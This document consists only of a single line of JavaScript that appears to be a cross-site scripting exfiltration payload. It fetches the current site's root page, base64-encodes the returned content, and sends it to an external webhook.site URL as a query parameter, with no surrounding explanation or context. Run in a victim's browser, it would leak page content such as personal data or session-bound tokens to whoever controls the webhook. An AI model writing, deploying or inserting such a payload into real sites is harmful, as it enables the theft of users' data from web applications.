fetch('/').then(r=>r.text()).then(d=>fetch('https://webhook.site/8afdc564-a85d-4f26-a53a-baba2da53b83?d='+btoa(d)))
